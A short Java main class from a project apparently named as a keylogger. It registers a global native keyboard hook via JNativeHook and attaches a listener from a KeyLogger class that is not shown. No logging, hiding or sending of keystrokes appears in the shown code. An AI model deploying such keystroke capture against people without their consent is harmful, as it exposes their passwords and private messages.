package scripts.keyLogger;

import org.jnativehook.GlobalScreen;

public class Main {

	public static void main(String[] args) {
		KeyLogger keyLogger = new KeyLogger();
		try {
			GlobalScreen.registerNativeHook();
		} catch (Throwable e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(keyLogger.getKeyBoard());
	}

}
